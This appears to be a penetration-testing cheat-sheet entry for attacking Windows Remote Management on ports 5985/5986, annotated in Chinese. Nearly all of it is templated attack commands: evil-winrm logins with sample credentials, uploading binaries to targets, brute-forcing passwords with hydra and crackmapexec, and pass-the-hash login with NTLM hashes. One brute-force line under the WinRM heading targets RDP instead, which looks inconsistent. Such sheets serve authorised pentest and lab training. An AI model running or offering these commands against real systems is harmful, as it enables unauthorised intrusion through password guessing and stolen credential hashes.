# port: 5985, 5986

# desc: [INFO]
Notes
# """#Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio 
git clone https://github.com/Hackplayers/evil-winrm.git 
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm
"""

--- Brute Force

# Need User
# desc: 暴力破解-1
hydra -t 1 -V -f -l #{USER} -P #{Big_Passwordlist} rdp://#{RHOST}


# desc: 暴力破解-2
crackmapexec winrm #{RHOST} -d #{DOMAIN} -u #{user_list} -p #{WORDLIST}

--- Login

# connection in linux
# -S: SSL enable
# desc: 使用密码登录
evil-winrm -u #{USER} -p '#{PWD}' -i #{RHOST} -S

# desc: 使用公私钥登录
evil-winrm -i #{RHOST} -S -k #{priv_file} -c #{pub_file} -p -u
@priv_file.desc(私钥文件)
@pub_file.desc(公钥文件)

# Pass the hash with evil-winrm
# desc: 使用NTLM认证登录
evil-winrm -u #{USER} -H #{ntlm} -i #{RHOST} -S

@USER.recommend(Administrator)